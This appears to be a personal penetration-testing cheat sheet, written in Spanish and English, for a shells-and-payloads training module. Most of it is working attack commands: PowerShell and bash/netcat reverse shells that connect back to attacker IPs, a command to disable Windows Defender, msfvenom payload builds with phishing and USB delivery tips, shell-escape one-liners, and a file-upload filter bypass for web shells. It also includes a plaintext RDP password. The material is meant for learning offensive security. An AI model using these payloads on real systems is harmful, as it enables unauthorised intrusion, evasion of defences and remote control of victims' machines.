[[Shells_Payloads_Module_Cheat_Sheet.pdf]]



conexion rdp
xfreerdp /u:admin /p:miClaveSegura123 /v:10.10.10.13

REVERSE SHELL WINDOWS 
listener -> sudo nc -nlvp 443
payload ```
```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.137',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```
es probable que windows defender la bloquee 
para desactivarlo en una consola powershell con permisos de admin
```powershell-session
PS C:\windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true
```

ONELINERS

Netcat/Bash Reverse Shell One-liner
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.

Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.

Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).

Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`)Uses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. 

The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed


PowerShell ONELINER
```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

MSFVENOM
staged < stageless

```shell-session
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
-p -> payoload
lhost lport -> localhost y localport al que enviar la shell
f -> formato en este caso elf (pasra windows .exe)

setup listener -> sudo nc -nlvp 443

enviar por email phising,  link de descarga en web, pendrive

INFILTRATING WINDOWS
windows TLL 32 o 128

DLL -> dynamic linking library library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.

Batch -> Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.

VBS -> VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.

MSI -> .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell.

POWERSHELL -> Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.

herramientas de payloads -> msfvenom(payloads), payloadallthethings(cheatsheets),  mythic c2 framework(payloads), nishang(powershell scripts), darkarmour(binaries)

INFILTRATING LINUX / UNIX

==SPAWN INTERACTIVE SHELLS / UPGRADE SHELL==

PYTHON SPAWN TTY INTERACTIVE SHELL
```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 
```
BASH SPAWN TTY INTERACTIVE SHELL 
```shell-session
/bin/sh -i
```
PERL
```shell-session
perl —e 'exec "/bin/sh";'
```
(desde script)->
```shell-session
perl: exec "/bin/sh";
```
RUBY
```shell-session
ruby: exec "/bin/sh"
```
LUA
(desde script)
```
lua: os.execute('/bin/sh')
```
AWK
```shell-session
awk 'BEGIN {system("/bin/sh")}'
```
FIND
```
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
```shell-session
find . -exec /bin/sh \; -quit
```
VIM
```shell-session
vim -c ':!/bin/sh'
```
VIM ESCAPE
```shell-session
vim
:set shell=/bin/sh
:shell
```

WEB SHELLS
a `web shell` is a browser-based shell session we can use to interact with the underlying operating system of a web server

Laudanum
contiene  plantillas de archivos injectables para obtener una webshell
aspx-> `Active Server Page Extended` (`ASPX`) is a file type/extension written for [Microsoft's ASP.NET Framework](https://docs.microsoft.com/en-us/aspnet/overview). On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let's witness this first-hand by utilizing the Antak Webshell.

systeminfo -> info windows

php webshell
si solo permite archivos de imagen se puede bypass con burpsuite
We will change Content-type from `application/x-php` to `image/gif`. This will essentially "trick" the server and allow us to upload the .php file, bypassing the file type restriction. Once we do this, we can select `Forward` twice, and the file will be submitted. We can turn the Burp interceptor off now and go back to the browser to see the results.


apache .war file revshell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f war -o shell.war

http://target:8080/shell/<nombredeljsp>.jsp

```
